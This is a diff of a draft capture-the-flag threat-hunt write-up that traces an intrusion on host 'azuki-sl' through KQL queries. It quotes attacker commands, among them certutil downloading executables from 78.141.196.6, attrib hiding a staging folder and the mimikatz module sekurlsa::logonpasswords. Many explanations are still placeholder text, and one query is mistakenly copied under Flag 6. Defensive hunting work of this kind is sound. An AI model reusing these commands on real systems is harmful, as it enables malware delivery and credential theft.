@@ -29,7 +29,11 @@
 - Recommendations
 
 ## Summary of Findings
-Below is a dropdown of all the findings for this threat hunt. To see my investigation steps, skip to the next section **Threat Hunt**
+Below is a dropdown of all the findings for this threat hunt. To see my investigation steps, continue to the next section **Threat Hunt**
+<details>
+  <summary>Show Findings</summary>
+	
+  <table>
 
 | Flag |                                 Objective                                  |                  Finding                  |           Timestamp            |
 | :--: | :------------------------------------------------------------------------: | :---------------------------------------: | :----------------------------: |
@@ -54,6 +58,10 @@ Below is a dropdown of all the findings for this threat hunt. To see my investig
 |  19  |             What IP address was targeted for lateral movement?             |               `10.1.0.188`                | `2025-11-19T19:10:42.057693Z`  |
 |  20  |         Identify the remote access tool used for lateral movement?         |                `mstsc.exe`                | `2025-11-19T19:10:42.057693Z`  |
 |      |                                                                            |                                           |                                |
+
+  </table>
+
+</details>
 
 ## Threat Hunt
 
@@ -95,7 +103,7 @@ Objective: **Identify the command and argument used to enumerate network neighbo
 
 Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.
 
-ABCABCABC
+Common tools used in [network discovery](https://attack.mitre.org/techniques/T1016/) include arp, ipconfig, ifconfig, nbstat, and route. So I decided to search through `DeviceProcessEvents` for any of these tools used on the command line.  
 ```KQL
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
@@ -104,14 +112,44 @@ DeviceProcessEvents
 | project Timestamp, AccountName, ProcessCommandLine
 | sort by Timestamp asc
 ```
+<p align="center"> 
+	<img width="555" height="339" alt="Screenshot 2026-01-07 at 6 52 18 PM" src="https://github.com/user-attachments/assets/c66dfc1f-7920-4a12-a5a8-72505f49ab1e" />
+</p>
+
+From the results, we see two of these tools used to discover more information about the network: 
+- `ipconfig.exe /all`
+- `arp.exe -a`
+
+Although `ipconfig.exe /all` can be used in the discovery process, it only provides local host network configurations.
+On the other hand, `arp.exe -a` reveals other systems on the local network (including IP addresses and MAC addresses).
 
 Flag: `arp -a` <br>
-Timestamp: `2025-11-19T19:04:01.773778Z``
+Timestamp: `2025-11-19T19:04:01.773778Z`
 
 ### 🚩 Flag 4: Defense Evasion - Malware Staging Directory
 Objective: **Identify the PRIMARY staging directory where malware was stored?**
 
 Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.
+
+BLAHBLAHBLAH
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where ProcessCommandLine has_any ("mkdir", "New-Item", "attrib")
+| project Timestamp, ActionType, FileName, FolderPath, ProcessCommandLine, SHA256
+| sort by Timestamp asc
+```
+<img width="1250" height="346" alt="Screenshot 2026-01-07 at 9 21 05 PM" src="https://github.com/user-attachments/assets/c5a20bee-9431-45e8-a946-c008581f17f8" />
+
+
+The attacker ran the following command `"attrib.exe" +h +s C:\ProgramData\WindowsCache`:
+- `attrib.exe` Windows utility to view or change file or folder attributes
+- `+h` mark as hidden
+- `+s` mark as system folder
+- `C:\ProgramData\WindowsCache` newly created directory
+
+The directory `C:\ProgramData\WindowsCache` is specifically crafted to resemble a Windows System directory to evade detection. If I didn't know any better, I would think this would be a common Windows directory.
 
 Flag: `C:\ProgramData\WindowsCache` <br>
 Timestamp: `2025-11-19T19:05:33.7665036Z`
@@ -121,6 +159,23 @@ Objective: **How many file extensions were excluded from Windows Defender scanni
 
 Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.
 
+BLAH BLAH BLAH BLAH
+```KQL
+DeviceRegistryEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where RegistryKey contains "Exclusions\\Extensions"
+| project Timestamp, ActionType, RegistryValueName, RegistryKey
+| sort by Timestamp asc
+```
+<img width="1055" height="369" alt="Screenshot 2026-01-07 at 7 09 05 PM" src="https://github.com/user-attachments/assets/b2c8ac23-c25c-4afd-82f5-440290f64902" />
+
+From the query, there were three different file extensions that were excluded from Windows Defender scanning: 
+- `.exe`
+- `.ps1`
+- `.bat`
+
+This would allow the attacker to download or execute any executable or script without triggering Microsoft Defender.
 
 Flag: `3` <br>
 Timestamp: `2025-11-19T18:49:29.1787135Z`
@@ -130,6 +185,22 @@ Objective: **What temporary folder path was excluded from Windows Defender scann
 
 Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
 
+BLAH BLAH BLAH
+```KQL
+DeviceRegistryEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where RegistryKey contains "Exclusions\\Extensions"
+| project Timestamp, ActionType, RegistryValueName, RegistryKey
+| sort by Timestamp asc
+```
+<img width="1114" height="330" alt="Screenshot 2026-01-07 at 7 11 35 PM" src="https://github.com/user-attachments/assets/aaa4b77b-3372-4cde-aa92-d4e8e1647a8f" />
+
+I found two directories that we excluded from being scanned by Windows Defender:
+- `C:\ProgramData\WindowsCache` the primary staging directory we discovered in Flag 4
+- `C:\Users\KENJI~1.SAT\AppData\Local\Temp`
+
+BLAH BLAH BLAH 
 
 Flag: `C:\Users\KENJI~1.SAT\AppData\Local\Temp` <br>
 Timestamp: `2025-11-19T18:49:27.6830204Z`
@@ -139,13 +210,44 @@ Objective: **Identify the Windows-native binary the attacker abused to download 
 
 Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.
 
-Flag: ``certutil.exe`` <br>
+BLAH BLAH BLAH BLAH
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where ProcessCommandLine contains "http"
+| project Timestamp, ActionType, FileName, FolderPath, FileSize, ProcessCommandLine
+| sort by Timestamp asc
+```
+<img width="1274" height="551" alt="Screenshot 2026-01-07 at 7 16 40 PM" src="https://github.com/user-attachments/assets/96fded26-4adc-4f01-a95b-6938cc5d9979" />
+
+After scrolling through the million of logs from Google Chrome checking for an update every 5 minutes, I discovered `certutil.exe` being used to download an executable to the primary stagin directory.
+
+`"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`
+- BLAH BLAH BLAH
+`"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
+- BLAH BLAH BLAH
+
+Flag: `certutil.exe` <br>
 Timestamp: `2025-11-19T19:06:58.5778439Z`
 
 ### 🚩 Flag 8: Persistence - Scheduled Task Name
 Objective: **Identify the name of the scheduled task created for persistence?**
 
 Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.
+
+BLAH BLAH BLAH
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where FileName contains "schtask"
+| project Timestamp, ActionType, FileName, ProcessCommandLine
+| sort by Timestamp asc
+```
+<img width="1276" height="346" alt="Screenshot 2026-01-07 at 7 18 31 PM" src="https://github.com/user-attachments/assets/562912c0-b215-4abc-a8b0-b84f3c25e0a9" />
+
+BLAH BLAH BLAH 
 
 Flag: `Windows Update Check` <br>
 Timestamp: `2025-11-19T19:07:46.9796512Z`
@@ -155,6 +257,13 @@ Objective: **Identify the executable path configured in the scheduled task?
 
 The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.
 
+BLAH BLAH BLAH 
+```KQL
+
+
+```
+BLAH BLAH BLAH 
+
 Flag: `C:\ProgramData\WindowsCache\svchost.exe` <br>
 Timestamp: `2025-11-19T19:07:46.9796512Z`
 
@@ -162,6 +271,17 @@ Timestamp: `2025-11-19T19:07:46.9796512Z`
 Objective: **Identify the IP address of the command and control server?**
 
 Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.
+
+BLAHBLAHBLAH
+```KQL
+DeviceNetworkEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
+```
+<img width="1878" height="378" alt="Screenshot_35" src="https://github.com/user-attachments/assets/1a9cad2c-1dc3-4971-896b-d5de9179e92a" />
+
+BLAH BLAH BLAH 
 
 Flag: `78.141.196.6` <br>
 Timestamp: `2025-11-19T19:11:04.1766386Z`
@@ -171,6 +291,10 @@ Objective: **Identify the destination port used for command and control communic
 
 C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.
 
+BLAH BLAH BLAH 
+```KQL
+same as above
+```
 
 Flag: `443` <br>
 Timestamp: `2025-11-19T19:11:04.1766386Z`
@@ -180,6 +304,16 @@ Objective: **Identify the filename of the credential dumping tool?**
 
 Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.
 
+BLAH BLAH BLAH 
+```KQL
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where FolderPath contains "C:\\ProgramData\\WindowsCache"
+```
+<img width="1179" height="399" alt="Screenshot 2026-01-07 at 7 27 53 PM" src="https://github.com/user-attachments/assets/ecb70c7e-3742-4728-bf3a-72207be9b554" />
+
+BLAH BLAH BLAH
 
 Flag: `mm.exe` <br>
 Timestamp: `2025-11-19T19:07:22.8551193Z`
@@ -189,6 +323,18 @@ Objective: **Identify the module used to extract logon passwords from memory?**
 
 Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.
 
+BLAH BLAH BLAH
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where ProcessCommandLine contains "mm.exe"
+| project Timestamp, ActionType, FileName, FolderPath, ProcessCommandLine
+| sort by Timestamp asc
+```
+<img width="1272" height="345" alt="Screenshot 2026-01-07 at 7 30 10 PM" src="https://github.com/user-attachments/assets/0ae9a21c-11df-4dbd-abca-ca8f4ee637db" />
+
+BLAH BLAH BLAH 
 
 Flag: `sekurlsa::logonpasswords` <br>
 Timestamp: `2025-11-19T19:08:26.2804285Z`
@@ -198,6 +344,20 @@ Objective: **Identify the compressed archive filename used for data exfiltration
 
 Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.
 
+BLAH BLAH BLAH
+```KQL
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where FolderPath contains "C:\\ProgramData\\WindowsCache"
+| where FileName endswith ".zip"
+| project Timestamp, ActionType, FileName, FileSize, FolderPath, SHA256, InitiatingProcessCommandLine
+| sort by Timestamp asc
+```
+<img width="1277" height="322" alt="Screenshot 2026-01-07 at 7 32 38 PM" src="https://github.com/user-attachments/assets/ff00ff6c-354f-4ec4-8fb0-704cfdc52ac9" />
+
+BLAH BLAH BLAH 
+
 Flag: `export-data.zip` <br>
 Timestamp: `2025-11-19T19:08:58.0244963Z`
 
@@ -206,6 +366,20 @@ Objective: **Identify the cloud service used to exfiltrate stolen data?**
 
 Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.
 
+BLAH BLAH BLAH 
+```KQL
+DeviceNetworkEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where InitiatingProcessCommandLine contains "export-data.zip"
+| where ActionType == "ConnectionSuccess"
+| where RemotePort == "443"
+| project Timestamp, ActionType, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
+| sort by Timestamp asc
+```
+<img width="1271" height="311" alt="Screenshot 2026-01-07 at 7 34 43 PM" src="https://github.com/user-attachments/assets/789fc949-9046-4cd5-8c95-4361c0445ed3" />
+
+BLAH BLAH LBHA 
 
 Flag: `discord` <br>
 Timestamp: `2025-11-19T19:09:21.4234133Z`
@@ -215,6 +389,16 @@ Objective: **Identify the first Windows event log cleared by the attacker?**
 
 Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.
 
+BLAH BLAH BLAH
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where ProcessCommandLine contains "wevtutil"
+```
+<img width="1290" height="561" alt="Screenshot 2026-01-07 at 7 38 33 PM" src="https://github.com/user-attachments/assets/ae50f18d-1bd4-404d-bcf7-102d943ff7f0" />
+
+BLAH BLAH BLAH
 
 Flag: `Security` <br>
 Timestamp: `2025-11-19T19:11:39.0934399Z`
@@ -224,6 +408,20 @@ Objective: **Identify the backdoor account username created by the attacker?**
 
 Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.
 
+BLAH BLAH BLAH 
+
+```KQL
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where ProcessCommandLine contains "/add"
+| project Timestamp, ActionType, ProcessCommandLine
+| sort by Timestamp asc 
+```
+<img width="1866" height="468" alt="Screenshot_6" src="https://github.com/user-attachments/assets/54a659f6-c966-4dc4-89f4-648ba3b30b38" />
+
+BLAH BLAH BLAH
+
 Flag: `support` <br>
 Timestamp: `2025-11-19T19:09:48.8977132Z`
 
@@ -231,6 +429,18 @@ Timestamp: `2025-11-19T19:09:48.8977132Z`
 Objective: **Identify the PowerShell script file used to automate the attack chain?**
 
 Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.
+
+BLAH BLAH BLAH 
+```KQL
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where FileName endswith ".ps1" or FileName endswith ".sh"
+| where FolderPath contains "temp"
+```
+<img width="1274" height="542" alt="Screenshot 2026-01-07 at 7 44 47 PM" src="https://github.com/user-attachments/assets/e702bc5a-3d22-491a-ad0c-af97245c063c" />
+
+BLAH BLAH BLAH
 
 Flag: `wupdate.ps1` <br>
 Timestamp: `2025-11-19T18:49:48.7079818Z`
@@ -240,6 +450,19 @@ Objective: **What IP address was targeted for lateral movement?**
 
 Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.
 
+BLAH BLAH BLAH
+```KQL
+DeviceNetworkEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where RemoteIPType == "Private"
+| project Timestamp, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteIPType, RemoteUrl
+| sort by Timestamp asc
+```
+<img width="1273" height="409" alt="Screenshot 2026-01-07 at 7 48 20 PM" src="https://github.com/user-attachments/assets/0ca8dd72-02c7-40f5-be19-d62baaffa59e" />
+
+BLAH BLAH BLAH
+
 Flag: `10.1.0.188` <br>
 Timestamp: `2025-11-19T19:10:42.057693Z`
 
@@ -248,6 +471,7 @@ Objective: **Identify the remote access tool used for lateral movement?**
 
 Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.
 
+same as above bro  BLAH BLAH BLAH BLAH
 Flag: `mstsc.exe` <br>
 Timestamp: `2025-11-19T19:10:42.057693Z`
 
